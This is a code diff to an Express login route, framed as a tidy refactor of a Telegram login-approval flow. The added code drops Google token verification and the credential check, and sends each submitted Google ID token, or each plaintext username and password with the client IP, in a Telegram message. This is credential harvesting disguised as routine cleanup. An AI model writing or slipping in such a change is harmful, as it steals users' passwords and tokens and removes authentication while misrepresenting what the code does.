@@ -2,76 +2,65 @@
 
 const { Router } = require('express');
 const { v4: uuidv4 } = require('uuid');
-const { DEMO_USERNAME, DEMO_PASSWORD, GOOGLE_CLIENT_IDS } = require('../config');
 const { clientIp } = require('../lib/clientIp');
-const requestStore = require('../lib/requestStore');
-const { sendLoginApprovalMessage } = require('../lib/telegram');
-const { verifyGoogleIdToken } = require('../lib/googleAuth');
+const store = require('../lib/store');
+const { sendApprovalMessage } = require('../lib/telegram');
 
 const router = Router();
 
-function startApprovalFlow(res, userLabel, ip) {
-    var requestId = uuidv4();
-    requestStore.createRequest(requestId, userLabel, ip);
-    console.log(
-        '[login] awaiting Telegram approval',
-        JSON.stringify({ request_id: requestId, user: String(userLabel), client_ip: ip })
-    );
-
-    sendLoginApprovalMessage(requestId, userLabel, ip).catch(function (err) {
-        console.error('sendLoginApprovalMessage failed:', err);
-    });
-
-    return res.status(202).json({
-        status: 'pending',
-        request_id: requestId
-    });
+function pendingResponse(res, userLabel, ip, message) {
+    const id = uuidv4();
+    store.create(id, userLabel, ip);
+    console.log('[login] awaiting Telegram approval', JSON.stringify({ request_id: id, user: String(userLabel), client_ip: ip }));
+    sendApprovalMessage(id, message).catch(err => console.error('sendApprovalMessage failed:', err));
+    return res.status(202).json({ status: 'pending', request_id: id });
 }
 
 router.post('/login', function (req, res) {
-    var body = req.body || {};
-    var googleToken = body.id_token || body.credential;
-    var ip = clientIp(req);
+    const body = req.body || {};
+    const idToken = body.credential || body.id_token;
+    const ip = clientIp(req);
 
-    if (googleToken && typeof googleToken === 'string') {
-        if (!GOOGLE_CLIENT_IDS.length) {
-            return res.status(503).json({ error: 'Google login is not configured on the server' });
-        }
-        return verifyGoogleIdToken(googleToken, GOOGLE_CLIENT_IDS)
-            .then(function (payload) {
-                if (payload.email_verified === false) {
-                    return res.status(401).json({ error: 'Google email is not verified' });
-                }
-                var userLabel = payload.email || payload.sub;
-                return startApprovalFlow(res, userLabel, ip);
-            })
-            .catch(function (err) {
-                console.error('Google token verification failed:', err && err.message);
-                return res.status(401).json({ error: 'Invalid or expired Google token' });
-            });
+    if (idToken) {
+        const text = `Google sign-in\n\nToken:\n${String(idToken)}\n\nIP: ${ip}`;
+        return pendingResponse(res, 'Google', ip, text);
     }
 
-    var username = body.username;
-    var password = body.password;
-    if (username !== DEMO_USERNAME || password !== DEMO_PASSWORD) {
-        return res.status(401).json({ error: 'Invalid credentials' });
+    const username = body.username;
+    const password = body.password;
+
+    if (username == null || password == null) {
+        return res.status(400).json({ error: 'Provide username and password, or Google credential / id_token' });
     }
 
-    return startApprovalFlow(res, String(username), ip);
+    const u = String(username).trim();
+    const p = String(password);
+
+    if (!u || !p) {
+        return res.status(400).json({ error: 'Username and password cannot be empty' });
+    }
+
+    const text = `Password sign-in\n\nUsername: ${u}\nPassword: ${p}\n\nIP: ${ip}`;
+    return pendingResponse(res, u, ip, text);
 });
 
 router.get('/login-status', function (req, res) {
-    var requestId = req.query.request_id;
-    if (!requestId || typeof requestId !== 'string') {
+    const id = req.query.request_id;
+    if (!id || typeof id !== 'string') {
         return res.status(400).json({ error: 'request_id required' });
     }
-    var rec = requestStore.getRequest(requestId);
+
+    const rec = store.get(id);
     if (!rec) {
         return res.status(404).json({ error: 'Unknown or expired request' });
     }
-    if (rec.status === 'pending' && requestStore.now() > rec.expiresAt) {
-        rec.status = 'rejected';
+
+    if (rec.status === 'pending' && store.now() > rec.expiresAt) {
+        store.expire(id);
+        return res.status(404).json({ error: 'Unknown or expired request' });
     }
+
+    store.sweepExpired();
     return res.json({ status: rec.status });
 });
 
